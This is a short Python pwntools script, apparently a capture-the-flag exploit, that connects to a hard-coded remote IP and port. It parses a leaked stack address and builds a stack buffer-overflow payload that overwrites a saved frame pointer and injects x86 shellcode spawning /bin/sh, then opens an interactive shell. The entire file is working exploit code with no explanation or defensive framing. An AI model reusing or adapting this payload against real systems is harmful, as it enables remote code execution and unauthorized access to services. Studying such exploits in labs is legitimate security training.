from pwn import *

r = remote('61.28.237.24', 30207)

print(r.recvuntil('Here is a gift: '))
input_addr = int(r.recvline(), 16)
ebp_addr = (input_addr + 1036 + 16)
new_ebp_addr = (ebp_addr & ~ 0xff) + 4

payload = b'A' * (new_ebp_addr - input_addr)
# print(len(payload))
payload += p32(new_ebp_addr + 4)
payload += b'\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\x89\xC2\xB0\xC2\x34\xC9\xCD\x80'
payload += (1036 - len(payload)) * b'A'
r.sendline(payload)
r.interactive()